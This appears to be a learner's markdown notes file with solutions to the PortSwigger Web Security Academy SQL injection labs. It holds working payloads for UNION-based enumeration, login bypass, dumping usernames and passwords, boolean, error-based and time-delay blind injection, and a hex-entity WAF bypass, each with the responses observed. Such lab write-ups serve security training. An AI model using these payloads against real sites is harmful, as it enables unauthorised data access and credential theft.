# SQL Injection

- https://portswigger.net/web-security/sql-injection/cheat-sheet

## SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```
'  // <- Error
' OR 1=1--
```

## SQL injection vulnerability allowing login bypass

In login form:
```
administrator'--
```

## SQL injection attack, querying the database type and version on Oracle

```
'  // <- Error
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  // <- Error

' UNION SELECT 'a','b' FROM dual--

' UNION SELECT BANNER, NULL FROM v$version--
```

## SQL injection attack, querying the database type and version on MySQL and Microsoft

```
'  // <- Error
' ORDER BY 1#
' ORDER BY 2#
' ORDER BY 3#  // <- Error

' UNION SELECT @@version, NULL#
```

## SQL injection attack, listing the database contents on non-Oracle databases

```
'  // <- Error
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  // <- Error

' UNION SELECT NULL,NULL--
' UNION SELECT 'a','b'--

' UNION SELECT table_name, NULL FROM information_schema.tables--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--

' UNION SELECT CONCAT_WS('~',username_abcdef,password_abcdef),NULL FROM users_abcdef--
```

## SQL injection attack, listing the database contents on Oracle

```
'  // <- Error
'--

' AND 1=1--
' AND 1=2--  // <- No records

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  // <- Error

' union select NULL,NULL from dual--

' union select table_name,NULL from all_tables--  // USERS_JBQHPM
' union select column_name,NULL from all_tab_columns where table_name='USERS_JBQHPM'--
' union select USERNAME_KUTLFE,PASSWORD_XXNVYJ from USERS_JBQHPM--
```

## SQL injection UNION attack, determining the number of columns returned by the query

```
'  // <- Error
'--

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--  // <- Error

' union select NULL,NULL,NULL--
```

## SQL injection UNION attack, finding a column containing text

```
'  // <- Error
'--

' ORDER BY 3--
' ORDER BY 4--  // <- Error

' union select NULL,NULL,NULL--
' union select 'a',NULL,NULL-- // <- Error
' union select NULL,'a',NULL--
```

## SQL injection UNION attack, retrieving data from other tables

```
'  // <- Error
'--

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  // <- Error

' union select username,password from users--
```

## SQL injection UNION attack, retrieving multiple values in a single column

```
'  // <- Error
'--

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  // <- Error

' union select NULL,NULL--
' union select 'a',NULL--  // <- Error
' union select NULL,'a'--

' union select NULL,@@version--  // <- Error
' union select NULL,version()--  // => PostgreSQL

' union select NULL,username||'~'||password from users--
```

## Blind SQL injection with conditional responses

```
'
'-- -
'#
' AND 'a'='a
' AND 'a'='b
```

No Vuln here.

In TrackingId cookie:
```
'  // No "Welcome back!" on the page
'--  // "Welcome back!" is back

' AND 1=2--  // No "Welcome back!" on the page
' AND 1=1--  // "Welcome back!" is back

' AND 'a'=SUBSTRING('administrator',1,1)--  // "Welcome back!" is present
' AND 'b'=SUBSTRING('administrator',1,1)--  // No "Welcome back!" on the page

' AND 'a'=SUBSTRING((SELECT username from users where username='administrator'),1,1)--  // "Welcome back!" is present
' AND 'b'=SUBSTRING((SELECT username from users where username='administrator'),1,1)--  // No "Welcome back!" on the page
```

Run script:
```
python3.9 blind-conditional-script-1.py
```

## Blind SQL injection with conditional errors

Same proccess as above. But this time TrackingId cookie behaves a bit differently:

```
'  // 500 response
'--  // 200 response

' union select NULL from dual--  // 200 response
' union select NULL,NULL from dual--  // 500 response

' union SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--  // 500 response
' union SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--  // 200 response

' union SELECT CASE WHEN ('a'=SUBSTR((SELECT username from users where username='administrator'),1,1)) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--  // 500 response
' union SELECT CASE WHEN ('b'=SUBSTR((SELECT username from users where username='administrator'),1,1)) THEN TO_CHAR(1/0) ELSE NULL END FROM dual--  // 200 response
```

Run script:
```
python3.9 blind-conditional-script-2.py
```

## Visible error-based SQL injection

Adding `'` to TrackingId returns with
```
'  // Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'a6VQmllgxCQ8CY4b''. Expected  char

'--  // No error

' union select version()--  // No error => PostgreSQL

' AND 1=CAST('1' AS int)--  // No error
' AND CAST('abc' AS int)--  // ERROR: invalid input syntax for type integer: "abc"

a6VQmllgxCQ8CY4b' AND 1=CAST((select username from users) AS int)--  // With ID not removed our query gets truncated: Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'a6VQmllgxCQ8CY4b' AND 1=CAST((select username from users) AS'. Expected  char

' AND 1=CAST((select username from users LIMIT 1) AS int)--  // ERROR: invalid input syntax for type integer: "administrator"

' AND 1=CAST((select password from users LIMIT 1) AS int)--
```

## Blind SQL injection with time delays

```
abc'||(SELECT SLEEP(10))-- -  // No results
abc'||(SELECT pg_sleep(10))-- -
```

## Blind SQL injection with time delays and information retrieval

```
x'||pg_sleep(10)--  // Cause the delay

' union SELECT CASE WHEN (1=1) THEN (SELECT 'x'||pg_sleep(3)) ELSE NULL END--  // Delayed response
' union SELECT CASE WHEN (1=2) THEN (SELECT 'x'||pg_sleep(3)) ELSE NULL END--  // Imediate response
```

Run the script
```
python3.9 blind-conditional-script-3.py
```

## SQL injection with filter bypass via XML encoding

```
POST /product/stock HTTP/2
...

<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            2'--
        </productId>
        <storeId>
            2
        </storeId>
    </stockCheck>
```
Respond with `"Attack detected"`

Those two respond with the same value. So it is being evaluated
```
<storeId>
    1+1
</storeId>
```

```
<storeId>
    2
</storeId>
```

Using `Hackvertor` we can bypass WAF and ensure we have SQL Iinjection:
```
<storeId>
    <@hex_entities>2 and 1=1<@/hex_entities>
</storeId>
```
```
<storeId>
    <@hex_entities>2 and 1=2<@/hex_entities>
</storeId>
```

Solution:
```
<storeId>
    <@hex_entities>2 union select username||'~'||password from users<@/hex_entities>
</storeId>
```

What `Hackvertor` does with its tags:
```
<storeId>
    &#x32;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x7c;&#x7c;&#x27;&#x7e;&#x27;&#x7c;&#x7c;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x66;&#x72;&#x6f;&#x6d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
</storeId>
```